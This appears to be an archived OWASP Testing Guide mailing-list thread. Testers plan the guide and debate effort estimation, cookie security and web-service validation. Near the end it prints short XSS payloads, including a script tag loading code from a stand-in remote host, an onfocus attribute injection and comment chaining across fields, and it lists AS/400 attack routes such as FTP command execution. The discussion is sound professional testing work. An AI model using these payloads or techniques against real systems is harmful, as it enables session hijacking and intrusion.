hey all,

Attached is, what i feel, the final draft of the initial outline.
If everyone is happy with what is included, i'll spend the remainder  
of this week creating the sections in which everyone can choose their  
chosen topic.

Obviously the basic penetration testing tips caused an interesting  
discussion, i'll have a think about the future of them within the  
testing guide.

Look forward to your feedback

Daniel

Hey,

Looks nice,
Maybe some things to add:
1) Clear definition of audit/assessment/penetration testing 
2) How to split up an application test into manageable network pentest /
assessment / system assessment / service assessments / application
testing ...
3) A section on reporting. We have good experience splitting reports up
into 
* technically detailed reports per test as first level of reporting, 
* then creating one detailed audit report grouping the findings,
analysis and recommendations together with some risk rating 
* and one management document with some nice color graphs and 1 page
summary

Regards,

Sebastien

definitely, this needs to be in there as i think there is still a

This slipped my mind and should have made it to the document, that  
will teach me to do stuff at 1am

Hi all,

What about cost, project estimation, etc.. ?

IMO the document should also provide some directions about this matter. or
is this subject more relevant to
Phase One doc. I know this domain is so vast and dynamic (web servers,
aplication servers, etc..) that is hard to estimate.

I believe something like OSSTM "Rule of Thumb" would be nice for WAVA, btw
nice word :)

Some directions about this subject can be of some benefits, as security pros
can provide customers with
"real" estimations and customers can get an idea of what to expect of the
engagement.

Take care,

I'd like to stay away from the cost factor, as the cost is constantly
changing (example, here in the UK, the day rate changes between 1000
pounds to 1400 pounds, depending on whom you are dealing with)

Cost in $$$ can be very fluctuating, I agree.
But as long as we stick to a rough estimate in (number_of_testers * test_days), I believe that a few hints could be quite helpful.

Ok, a small section detailing what an average test should take to complete
as well as deliverables maybe?

maybe a good way to go is to help people out there distinguish from the
cowboys offering app testing to the companies/individuals who actually do
the job correctly

Is this a "How long is a piece of string" estimate, a guess.
Number of testers * number of days is subjective upon the application size 
and complexity. Administration support to assist in tasks is also a key 
factor. The quality of the data and stability of the application would 
affect time lines also.
If this is a black box we dont know the LOC so we can not estimate that way. 
I do such a thing with code review (7KLoc/day) to give an estimate on 
completion time.
So is putting average time to do a test really useful.
Would it not be better to get the industry average daily cost per 
resource(person)?

Now, Off to walk to dog ;0)

True, but a guideline (with a massive caveat stating this isnt set in
concrete blah blah blah) would help companies who have zero understanding
of app testing to understand if they are being taken for a ride.

Ok, hows about i'll write up the section and everyone can review it once
the rest of the sections are finished? We have a large amount of work
still to do and i'd rather we get started than getting slowed down on the
smaller issues

Exactly.
I agree that needed resources heavily depend on the complexity/size/insert_your_favorite_variable_here of the application, but exactly for this reason it would be great to provide a few hints to help companies to have some clues about how much effort is needed to test their apps.

Sounds great :)

I agree.  Especially in black box testing, you can provide some rough
rule of thumb stuff for a timebox for various applications.  It will at
least provide a rough guesstimate for the poor project manager who's
trying to make sure the application is secure and needs to put some
number in the budget.

Hi

A comment about secure cookies: 

On 5/4/05, Eoin Keary <eoinkeary at hotmail.com> wrote:
> Authentication:
> ???     Token storage? (If not marked as 'secure' a cookie will be stored on hard

As far as I have observed, the secure attribute for a cookie is only
used to instruct the client web browser to transmit that cookie over a
"secure", i.e. SSL/TLS/HTTPS, connection [thus not in clear text
HTTP].

While it is the expiry date that determines whether it is written to
hard disk or not (irrespective of whether or not the secure attribute
has been set). So if the expiry date is set in the future, the cookie
is written to disk for future use, even if the secure attribute is
set.

With reference to RFC2109 I like to describe the risk here as:
This optional attribute "directs the user agent to use only secure
means to contact the origin server" (per the RFC2109 of 1997:
http://www.faqs.org/rfcs/rfc2109.html).  Therefore, without the
"secure" attribute there is the risk that a user may have his web

Hi

A comment about secure cookies:

As far as I have observed, the secure attribute for a cookie is only
used to instruct the client web browser to transmit that cookie over a
"secure", i.e. SSL/TLS/HTTPS, connection [thus not in clear text
HTTP].

While it is the expiry date that determines whether it is written to
hard disk or not (irrespective of whether or not the secure attribute
has been set). So if the expiry date is set in the future, the cookie
is written to disk for future use, even if the secure attribute is
set.

With reference to RFC2109 I like to describe the risk here as:
This optional attribute "directs the user agent to use only secure
means to contact the origin server" (per the RFC2109 of 1997:
http://www.faqs.org/rfcs/rfc2109.html).  Therefore, without the
"secure" attribute there is the risk that a user may have his web
browser submit the cookie details in an insecure way, thus revealing
potentially valuable details regarding his session.  This, in turn,
could allow his session to be hijacked by a malicious unauthorised
user.

After talking to a number of people in the academic and industry I still 
dont think we should use "guesstimates" in documents we would like to become 
industry standards.

The document is depicting fact, procedure and best practice, but under the 
"How long shall this take/Cost" section we are going to answer: "Guess".
Sounds a bit foolish and also damages the integrity of the document. I know 
ISO 17799 or COBIT docs dont have guessing games ;0)

Just a thought.

very clear point, Eoin.

What if instead of trying to answer a question like "how long does it take" we limit ourselves to something like "what should you consider to estimate the effort" ?

I am thinking here about a short section that briefly mentions aspects like:

- dimension of the application (10 pages/views ? 100 ? 1,000 ?)
- complexity (static ? dynamic ? requires authentication ?)
- interconnections to other systems (is it stand-alone ? or fetches data from a dozen of backend databases) ?

No more than 1 or 2 pages, describing the variables that affect the needed effort, but without giving a quantitative measure of the effort itself. That would help managers to perform a reasonable analysis of the needed resources, and at the same there would not be any "guesstimate" in our document...

Hi Alberto,
Good call, I think that is a much better solution.
A qualitative instead of a quantitative approach. Similar to trying to nail 
unknowns in risk assessment.
Better than a ?guesstimate? anyways!

So points to affect the critical path of the timeline:

Complexity: (which is a subjective measure).

Size (relative measure also) is it 10 "pages" or 1000?

Technology - related to complexity. Pen testing web services may take longer 
than a "vanilla" application.

Areas of focus, obviously confidential areas would take more time and one 
would take more effort to test these areas?

Stability of the app is always an issue.

Types of user: For every distinct user type the test shall be different 
because what is available to that user changes with role type. (if you know 
what I mean)?^&*##

Any other suggestions to add to this list, anybody???
Send them to Dan C (daniel.cuthbert at owasp.org), Not me, he?s the leader!!

2 cents

This is going to lead to an industry where joe blogs does the minimum
possible to complete a checklist for the lowest cost possible. This is
not condusive to promoting good quality testing and is 100% wrong IMHO.

OK someone asked me to clarify. I am not against checklists. I am
against someone proposing an industry accepted pricing model (times to
test, same difference) that will lead to people working backwards from
money and not forwards from technical needs.

2 cents

This is going to lead to an industry where joe blogs does the minimum
possible to complete a checklist for the lowest cost possible. This is
not condusive to promoting good quality testing and is 100% wrong IMHO.

Hi Alberto,
Good call, I think that is a much better solution.
A qualitative instead of a quantitative approach. Similar to trying to
nail unknowns in risk assessment.
Better than a "guesstimate" anyways!

So points to affect the critical path of the timeline:

Complexity: (which is a subjective measure).

Size (relative measure also) is it 10 "pages" or 1000?

Technology - related to complexity. Pen testing web services may take
longer than a "vanilla" application.

Areas of focus, obviously confidential areas would take more time and
one would take more effort to test these areas?

Stability of the app is always an issue.

Types of user: For every distinct user type the test shall be different
because what is available to that user changes with role type. (if you
know what I mean)?^&*##

Any other suggestions to add to this list, anybody???
Send them to Dan C (daniel.cuthbert at owasp.org), Not me, he's the
leader!!

Hi Mark

Surely there is benefit to be obtained for us all if we can find a
workable model for assessing the amount of effort required for these
types of engagements.  It is a problem faced not only by the providers
of the services, but also by the customers. In practical terms this is
not going to be easy? so I feel it is encouraging to see the
suggestions that have been made so far.

I would argue that a pricing model IS quite a separate matter.  It is
subjective and will end up undergoing negotiation when it comes to
concluding the sale anyway.  Of course any customer would want to get
the job done at the cheapest possible price. It is not just up to the
provider of the service to establish the market price. Supply and
demand form a healthy part of any commercial activity. So it would
also be for the benefit of the customer to understand the amount of
effort that they should be expecting to receive for their money. 
Armed with this knowledge, they would then surely be better equipped
to weed out the "joe blogs" who intends to do "the minimum possible to
complete a checklist" and be capable of identifying the service
providers that are going to provide a service appropriate to their
requirements.

So I would say let's keep the suggestions flowing!

Regards,
Steve

Hi Mark,
The original thread was discussing the idea of "How long would testing 
take".
People suggested guessing. Putting this into a document that we hope is 
going to be industry standard is a bit foolish if this document is to be 
taken seriously.
Another idea (below) is to do some qualitative analysis on the application 
to be tested and to take into account some factors which may affect the 
timeline. The solution below is better than guessing (don't you think?). Do 
you have any better ideas how to estimate work effort for a arbitrary test?

Subject: [OWASP-TESTING] final draft of the outline

Hey Mark,
I would agree with Stephen. As a consultant if someone asked "How long will 
this assessment take" the reply would be based on the knowledge of the 
complexity of the application as opposed to "How much do you have to spend" 
;0)
Eventhough this probably happens in industry all the time ;0o

I know where Mark is coming from, hell there are a bucket load of  
lazy people out there who would use it as "but OWASP said it would  
take this long and thats all im going to do"

I have to admit, i was always nervous about adding such a section but  
could see the benefits if it was done correctly.
Can we maybe leave this as a side addition and work out a way to best  
approach it?

Message-ID: <F4DCE21F-2307-40C1-8A43-6AD7B6C321E4@owasp.org>

Morning all,

We have all pretty much agreed on the overall TOC's for the 2nd  
phase, so i will be spending next week creating the individual  
sections in order for everyone to choose their chosen speciality.

Since I',m now a freelancer (and yes that does mean you can hire me  
for short term contracts  :0), i will have more time to devote to  
OWASP projects.  I will be pushing this 2nd phase to be in some form  
of completion by the end of July if possible.
I'm hoping with the 80+ subscribers to this list, the work should be  
of a high level and also completed in time, but I understand everyone  
has jobs and a normal life.

Again, any issues/comments/flames/offers of work -----> mail me

Daniel

Hi all,
 
This thread about Cost/Project Estimation is getting a lot of heat! I guess thats good ;)
 
I can understand both sides of the fence, but I can also see the benefits of providing some guides to
these issues.
 
Maybe we can continue as planned, working on the phase 2 as normal (lead by Daniel :), but also creating a rough draft 
covering project estimation and such... In this draft we could make very clear this is not a guide
to be follow letter by letter but just a general guide.
 
So at the end we can have a possible Phase 2 industry stantard and the draft.
 
Will this help  or is a bad idea ?

Anyone ever hear of LANSA Integrator or LANSA for the web.
developed by LANSA.com?
It enables webservices on AS400 boxes and stuff like that.
The documentation has very little security but a vendor for LANSA claims it 
is "bulletproof" :)

Anyone? Anyone ever used, developed with or pen tested this?

It looks like a pile of poop but there seems to be no information on Google 
regarding this product and any security relating to it.

cheers,
Eoin

I personally use when estimating:

1 day per 1,000 lines of code for OWASP Top 10 reviews
1 day per 100 lines of code for comprehensive OWASP reviews
- and I add a bit for every trust boundary I identify in the component
model. 

I also factor in what my client wants - an "absolute" guarantee or just a
feeling of how their application is going.

If it's a best effort basis, such as capped at X days or a certain fixed
price, it's fun to read  the disclaimer to cover my large derriere as
capping it like this is a sure fire way to miss something in the rush to not
lose money on the deal.

I've done many reviews, and most have been a few weeks in length, producing
reports in the 80+ page range. I do look for the bigger issues first, so I
know the worst problems early on.

However, I don't think the Testing guide should have day estimation
information. Honestly, I'd prefer it included decent approaches to testing
the application in various ways, and let individuals work out how to cost
and price these activities.

I use the total number of inputs to generate my assessment estimates. If an
input appears several times in different pages I count it several times. An
input for this purpose can be anything from a cookie or a session id, to a
hidden value or an url parameter. I end up with an estimated number of
inputs that has worked for me in reflecting both size and complexity.

Code review I address on per line basis and everything else I just put it
into a fixed duration (like web server assessment, report generation and an
additional buffer for research). The only variable I consider is the
consultants' experience with the specific technology which can affect
delivery times.

Good Day, Ladies and Gents,
Has anvbody ever Hacked an AS400 box?
I have done a code review on a Web-enabled AS400 box and see some fields are 
not data validated.

The box vested interests say "you can't hack an AS400 man"!! Yeah right, 
they have thrown down the gauntlet so I must respond with furious wrath and 
use myt Jedi skills to prove them wrong.
.... Enough if the gibberish (too much coffee).

,anyways Anybody any experience in this area, help/advice/tips would be 
appreciated.

best regards,
Eoin.

Hi Eoin,

We have hacked AS-400 repeatedly for several of our clients. It is mainly
through configuration errors though, there is little vulnerabilities besides
that. I have never tried to do SQL Injection into an AS/400 DB2 but
theoretically that should work. Here are a few links that may prove useful:

- http://www.venera.com/downloads.htm
- http://www.securityfocus.com/archive/1/241592/2005-01-16/2005-01-22/1
- http://www.securityfocus.com/bid/4059/discussion/
- http://www.itjungle.com/tfh/tfh111102-story04.html


Also keep in mind that most web vulnerabilities (cross site scripting,
session management, sql injection, etc.) are completely OS independent and
should work regardless of the underlying server.

There is no guide for configuration errors, but keep in mind that ftp is one
of their main holes; you can execute commands using QUOTE and access most of
the files in a normal configuration (in addition to easy sniffing or brute
forcing of the password). The other big problem we normally find is all
object privileges for "unprivileged" users. There are a few ways of getting
execution or privilege escalation but they would require a deep knowledge of
OS/400. We can discuss further if you have a specific questions. I hope this
helps.

Greetings,
Victor

Hi,

Last year I tumbled over http://www.as400security.net/, 
they have some tools / guidelines but you have to pay for them.

Message-ID: <BAY18-F24A22E2A3957D0D694E545A6170@phx.gbl>

Hi,
I have a window of 25 chars to perform a XSS exploit.
anything more is truncated by the server.

<script src=http://a.com/z.js></script>

- this is 39 chars
We can do HTML injection ("<a href=....") to a degree but anyone any ideas 
on how to execute script in such a small window (25 chars)?
we need to stay in the same domain (xyz.com) inorder to make the attack 
useful. so redirecting to another domain with the "<a href..." is no good.

First correct answer gets a pint of Guinness (Larry S, you're not included 
for the pint as I owe you too many).

You could use tinyurl.com to embed a malicious link
(say, one that executes a XST attack). This still
requires a windows larger than 25 to get the domain to
execute a malicious XSS, I think.

Actually, you could include the  <img

and have the tiny url point to a java script
somewhere.

Do I get my pint?

Yeah, quite right... well, almost - just needed a space and an extra slash:

Interestingly, why have they only restricted it to 25 characters and  
where is this being enforced and by what?

I ran into exactly this issue today. Since it was injecting into a form 
value, I used something like " onfocus=alert() " -- pretty short!

One other cool technique invented (as far as I know) by Bruce Mayhew here is 
to inject a comment start <!-- in one field and a closer in the next 
field -->.  That way you can chain the fields together and your script can 
span fields.

Subject: [OWASP-TESTING] Web services - DV Auth or Auth DV???
Message-ID: <BAY18-F17C120476027678743A045A60D0@phx.gbl>

Hi,
Just I'd throw this out so see opinion:

A webservice:
Uses HTTPS. The Payload (SOAP) is in the HTTP Header.
The password and UserId are also in the HTTP header as header parameters.
(We can see the obvious issues here already?!#!?)

So,
The service needs a requester to be authenticated.
So sneding SOAP request (Over HTTPS) to this service gives us "Access 
Denied" as I put in an incorrect password...ok so far
Sending a modified request which the XML schema does not like (malformed 
request for example) gives us a Data validation error....So DV is done 
before authentication.

Which should come first in the case of webservices...?
DV or Auth.
If DV is first we may be able to do a DoS by sending 1000's of requests, 
each one needing to be DV'ed. (Webservices are prone to DOS attacks).
By doing Auth first, we need to DV the userId and password, Authenticate and 
then continue with the DV, which is complex....

Anyone have any ideas which should be first, the "chicken or the egg"?
I have my own opinions but what do you good people think?
